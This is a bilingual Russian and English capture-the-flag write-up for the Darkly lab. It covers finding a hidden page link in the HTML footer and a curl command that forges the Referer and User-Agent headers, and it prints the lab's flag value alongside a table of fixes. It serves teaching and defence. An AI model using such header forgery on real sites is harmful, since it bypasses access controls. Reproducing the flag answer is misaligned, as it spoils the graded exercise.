# Header Spoofing + Hidden Page in HTML Comment (FIXED VERSION)

> **Тип уязвимости / Vulnerability Type:** Information Disclosure + HTTP Header Forgery
> **Уровень сложности / Difficulty:** Beginner
> **Платформа / Platform:** Darkly (учебный проект / educational lab)

---

## 🇷🇺 Русская версия

### Что произошло — общая картина

В этом задании используются две уязвимости:

1. **Information Disclosure через HTML-исходник** — скрытая ссылка на страницу присутствует в коде сайта (в футере), но не отображается как явный элемент интерфейса.
2. **Header-based access control bypass** — доступ к странице ограничен проверкой HTTP-заголовков `Referer` и `User-Agent`, которые полностью контролируются клиентом и могут быть подделаны.

---

### Шаг 1 — Найти скрытую ссылку в исходнике

Открываем исходный код главной страницы:

```bash
curl -s http://localhost:8080/
```

⚠️ Важно: в zsh нельзя безопасно использовать `!` внутри `grep "<!--"` из-за history expansion, поэтому такой вариант может дать ошибку:

```text
zsh: event not found
```

---

В полученном HTML видно, что скрытая ссылка находится в футере:

```html
<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
    <li>&copy; BornToSec</li>
</a>
```

👉 Это и есть entry point к скрытой странице.

---

### Шаг 2 — Переход на скрытую страницу

Открываем URL:

```
?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

Ответ сервера уже содержит результат прямо в HTML:

```html
<script>
alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');
</script>
```

👉 Флаг не защищён дополнительно — он просто выводится в ответе сервера.

---

### Шаг 3 — Обход проверки заголовков (если применяется)

Если сервер дополнительно проверяет заголовки, их можно подменить:

```bash
curl -s \
  -H "Referer: https://www.nsa.gov/" \
  -H "User-Agent: ft_bornToSec" \
  "http://localhost:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

---

### Логика атаки — цепочка

```
Исходный HTML содержит скрытую ссылку в футере
    ↓
Пользователь переходит по ?page=...
    ↓
Сервер возвращает HTML с JavaScript alert
    ↓
Флаг отображается прямо в ответе
    ↓
(опционально) защита через Referer/User-Agent обходится подменой заголовков
```

---

### Как исправить

| Проблема                | Решение                                       |
| ----------------------- | --------------------------------------------- |
| Скрытые ссылки в HTML   | Убрать из публичного исходника                |
| Доверие к User-Agent    | Никогда не использовать для авторизации       |
| Доверие к Referer       | Не использовать как механизм контроля доступа |
| Выдача флага в JS alert | Возвращать через защищённый backend-канал     |

---

## 🇬🇧 English Version

### Overview — What Happened

This challenge involves two issues:

1. **Information disclosure in HTML source code** — a hidden link is exposed in the page footer.
2. **Header-based access control bypass** — the page relies on `Referer` and `User-Agent` headers, which are fully client-controlled and can be spoofed.

---

### Step 1 — Find the Hidden Link

Fetch the page source:

```bash
curl -s http://localhost:8080/
```

⚠️ Note: in zsh, using `grep "<!--"` may fail due to `!` history expansion:

```
zsh: event not found
```

---

The hidden link is found in the footer:

```html
<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
```

---

### Step 2 — Access Hidden Page

Visiting the URL returns:

```html
<script>
alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');
</script>
```

The flag is directly embedded in the server response.

---

### Step 3 — Header Spoofing (if enforced)

```bash
curl -s \
  -H "Referer: https://www.nsa.gov/" \
  -H "User-Agent: ft_bornToSec" \
  "http://localhost:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

---

### Attack Chain

```
Hidden link exposed in HTML footer
    ↓
User accesses page parameter
    ↓
Server returns JavaScript alert with flag
    ↓
Optional header checks can be bypassed
```

---

### Fixes

| Issue                | Fix                                 |
| -------------------- | ----------------------------------- |
| Hidden links in HTML | Remove from public source           |
| User-Agent trust     | Never use for auth                  |
| Referer trust        | Not reliable for security           |
| Sensitive data in JS | Move to backend-controlled response |

---
